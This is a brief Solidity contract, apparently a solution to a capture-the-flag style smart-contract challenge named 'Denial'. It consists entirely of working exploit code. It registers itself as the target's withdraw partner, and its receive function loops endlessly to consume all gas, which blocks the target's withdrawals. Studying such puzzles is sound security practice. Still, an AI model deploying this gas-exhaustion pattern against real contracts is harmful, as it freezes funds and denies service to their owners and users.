pragma solidity ^0.8.13;

contract DenialSolver {

    function solve(address t) public {
        Target(t).setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (true) { } // Burning gas like the is no global warming 
    }

}

interface Target {
    function setWithdrawPartner(address partner) external;
}